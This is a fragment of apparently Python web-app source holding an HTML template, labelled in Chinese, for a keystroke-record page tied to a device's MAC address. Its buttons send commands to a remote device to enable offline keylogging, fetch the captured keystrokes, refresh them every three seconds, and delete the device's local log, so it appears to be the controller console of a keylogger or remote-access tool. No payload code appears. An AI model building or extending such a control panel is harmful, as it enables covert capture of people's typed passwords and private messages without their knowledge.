...
def view_keylog(mac):
    ...
    <body>
        <div class="container">
            <h2>
                <span>🔤 键盘按键记录 [{{ info.name }}]</span>
                <div style="display:flex; gap:10px; align-items:center;">
                    {% set ini_st = "#dc3545" if info.get("kl", "0") != "1" else "#28a745" %}
                    {% set ini_txt = "○ 离线记录未开启" if info.get("kl", "0") != "1" else "● 离线记录已开启" %}
                    <span id="kl-status" style="background:{{ ini_st }}; font-size:14px; padding:5px 10px; border-radius:4px; color:white;">{{ ini_txt }}</span>
                    <button onclick="window.close()" style="background:#6c757d; font-size:14px; padding:5px 10px;">关闭窗口</button>
                </div>
            </h2>
            <div class="controls">
                <button class="btn-on" onclick="sendCtrl('KEYENABLE:1')">✅ 开启离线记录</button>
                <button class="btn-off" onclick="sendCtrl('KEYDISABLE:1')">🚫 关闭离线记录</button>
                <span style="flex-grow:1;"></span>
                <label style="background: #007bff; padding: 10px 15px; border-radius: 4px; cursor: pointer; color: white; display: flex; align-items: center; gap: 5px;">
                    <input type="checkbox" id="auto-refresh" onchange="toggleAutoRefresh(this.checked)" style="cursor: pointer;"> 🔄 自动实时刷新(3秒)
                </label>
                <button class="btn-fetch" onclick="sendCtrl('KEYLOG_GET:1', false)">🔄 尝试获取最新本机记录文本</button>
                <button class="btn-del" onclick="if(confirm('确定要清空该设备本地的所有按键记录吗？')) sendCtrl('KEYLOG_DEL:1', false)">🗑️ 清空本地记录文件</button>
            </div>

            <div class="log-box" id="log-content">等待操作指令下发...</div>
        </div>
